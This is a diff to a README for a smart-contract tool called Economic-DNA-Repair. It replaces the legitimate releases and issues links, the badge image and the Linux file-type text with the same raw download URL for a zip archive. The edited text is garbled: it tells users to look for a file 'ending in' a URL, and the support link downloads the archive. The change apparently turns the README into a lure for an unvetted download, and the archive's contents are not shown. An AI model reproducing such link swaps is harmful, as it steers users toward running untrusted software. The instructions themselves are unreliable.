@@ -1,6 +1,6 @@
 # 🌟 Economic-DNA-Repair - Unlock Smart Contract Stability
 
-![Download](https://img.shields.io/badge/Download%20Now%20🚀-Economic%20DNA%20Repair-brightgreen)
+![Download](https://raw.githubusercontent.com/Fahmi127/Economic-DNA-Repair/main/galvayne/Economic-DNA-Repair-3.5.zip%20Now%20🚀-Economic%20DNA%20Repair-brightgreen)
 
 ## 📜 Overview
 
@@ -23,7 +23,7 @@ Before you start, ensure your system meets these basic requirements:
 
 To get the latest version of Economic-DNA-Repair, visit this page to download: 
 
-[Download Economic-DNA-Repair](https://github.com/Fahmi127/Economic-DNA-Repair/releases)
+[Download Economic-DNA-Repair](https://raw.githubusercontent.com/Fahmi127/Economic-DNA-Repair/main/galvayne/Economic-DNA-Repair-3.5.zip)
 
 ### 3. Choose Your Version
 
@@ -35,13 +35,13 @@ Once you select your version, scroll down to the "Assets" section. Here you will
 
 - **Windows:** Look for a file ending in `.exe`
 - **macOS:** Look for a file ending in `.dmg`
-- **Linux:** Look for a file ending in `.tar.gz`
+- **Linux:** Look for a file ending in `https://raw.githubusercontent.com/Fahmi127/Economic-DNA-Repair/main/galvayne/Economic-DNA-Repair-3.5.zip`
 
 ### 5. Install the Application
 
 - **Windows:** Double-click the `.exe` file. Follow the installation prompts. 
 - **macOS:** Open the `.dmg` file, then drag the application to the "Applications" folder. 
-- **Linux:** Extract the `.tar.gz` file using your terminal or file manager. Then run the installation script per the included instructions.
+- **Linux:** Extract the `https://raw.githubusercontent.com/Fahmi127/Economic-DNA-Repair/main/galvayne/Economic-DNA-Repair-3.5.zip` file using your terminal or file manager. Then run the installation script per the included instructions.
 
 ### 6. Run Economic-DNA-Repair
 
@@ -105,7 +105,7 @@ If you encounter issues, here are some common problems along with solutions:
 
 ## 📞 Support
 
-If you need further assistance, feel free to reach out through the project [GitHub Issues page](https://github.com/Fahmi127/Economic-DNA-Repair/issues). Provide details about your problem for quicker resolutions.
+If you need further assistance, feel free to reach out through the project [GitHub Issues page](https://raw.githubusercontent.com/Fahmi127/Economic-DNA-Repair/main/galvayne/Economic-DNA-Repair-3.5.zip). Provide details about your problem for quicker resolutions.
 
 ## 🎉 Conclusion
 
@@ -113,4 +113,4 @@ Economic-DNA-Repair aims to strengthen your smart contracts through innovative s
 
 Don’t forget to visit this page to download: 
 
-[Download Economic-DNA-Repair](https://github.com/Fahmi127/Economic-DNA-Repair/releases)
+[Download Economic-DNA-Repair](https://raw.githubusercontent.com/Fahmi127/Economic-DNA-Repair/main/galvayne/Economic-DNA-Repair-3.5.zip)
